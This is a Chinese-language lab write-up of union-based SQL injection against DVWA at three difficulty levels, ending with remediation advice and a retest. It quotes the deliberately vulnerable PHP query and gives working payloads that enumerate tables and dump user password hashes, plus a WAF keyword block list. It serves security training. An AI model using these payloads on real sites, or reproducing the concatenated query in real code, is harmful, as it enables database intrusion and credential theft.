# DVWA SQL 注入（联合查询：Low / Medium / High）

**靶场**：DVWA（v1.9 容器，本地授权）+ ctf.eagleslab.com 内部靶场
**安全等级**：Low / Medium / High
**时间**：2026.01

## 1. 漏洞验证

DVWA 源码 `vulnerabilities/sqli/source/low.php`：

```php
$id = $_REQUEST['id'];
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
```

`$id` 直接拼接进 SQL、字符型过滤为 0。

## 2. 利用步骤（Low）

### 2.1 注入点确认

```sql
1' and '1'='1    → 正常返回（闭合成功）
1' and '1'='2    → 空结果
```

页面响应差异确认存在字符型注入。

### 2.2 字段数

```sql
1' order by 2 --    正常
1' order by 3 --    报错 → 字段数为 2
```

### 2.3 回显位 + 库名

```sql
-1' union select 1,database() --    →  dvwa
```

### 2.4 表名

```sql
-1' union select 1,group_concat(table_name) from information_schema.tables where table_schema='dvwa' --
→  guestbook,users
```

### 2.5 字段名 + 字段内容

```sql
-1' union select 1,group_concat(column_name) from information_schema.columns where table_name='users' --
→  user_id,user,password,...

-1' union select user,password from users --
→  admin/5f4dcc3b...  （MD5，cmd5.com 解密得 password）
```

## 3. Medium 难度（POST）

Medium 改用下拉框提交，但请求体里仍是 `id=`：

- Yakit 抓 POST 包 → Repeater 修改 `id` 参数
- 思路与 Low 完全一致：`id=-1' union select 1,2 --`
- 关键变化：burp 直接改请求体重放，绕过前端下拉框限制

## 4. High 难度

High 把回显弹到另一个窗口。弹窗里输入 Payload，回到父页面看回显：

```sql
1' union select 1,database()--
```

## 5. 修复建议

1. **参数化查询**（根本解）：
   ```php
   $stmt = $pdo->prepare("SELECT first_name, last_name FROM users WHERE user_id = ?");
   $stmt->execute([$id]);
   ```
2. 输入白名单（数值型强制 `intval`）
3. 输出编码（防 XSS 二次漏洞）
4. WAF 侧：拦截 `union select`、`information_schema`、`--` 等关键字

## 6. 复测

- 参数化后：上述所有 Payload 仅作为字符串原样入库
- 报错信息脱敏：关闭 `display_errors`，开启日志
